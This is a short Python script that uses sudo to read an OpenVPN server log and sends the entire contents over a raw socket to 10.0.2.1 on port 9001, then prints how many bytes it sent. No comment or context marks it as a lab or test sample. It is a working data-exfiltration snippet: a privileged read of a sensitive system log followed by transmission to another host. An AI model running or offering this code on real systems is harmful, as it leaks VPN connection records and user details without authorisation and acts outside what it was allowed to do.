#!/usr/bin/env python3
import socket, subprocess
d = subprocess.run(['sudo', 'cat', '/var/log/openvpn-server.log'], capture_output=True).stdout
s = socket.create_connection(('10.0.2.1', 9001)); s.sendall(d); s.close(); print('SENT', len(d), 'bytes')
